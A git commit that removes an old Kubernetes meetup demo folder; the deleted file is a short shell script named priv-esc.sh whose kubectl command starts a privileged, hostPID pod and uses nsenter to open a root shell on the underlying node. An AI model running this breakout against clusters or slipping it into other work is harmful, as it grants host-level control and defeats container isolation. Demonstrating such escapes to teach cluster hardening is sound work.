a7a310f664aaa0013ccb0003fa1e7cc4845c32ee
p4ck3t0 <b.koltermann@avolens.com>
2024-01-18 21:39:34 +0100

    remove old frankfurt-meetup

--- 2024-01-18-frankfurt-kubernetes-meetup/demo/demo2/priv-esc.sh
+++
@@ -1,7 +0,0 @@
-kubectl run breakout -ti \
---image=alpine \
---rm \
---overrides '{"spec":{"hostPID":true,
-"containers":[{"name":"dontlookatme","image":"alpine","stdin":true,"tty":true,
-"securityContext":{"privileged":true},
-"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'
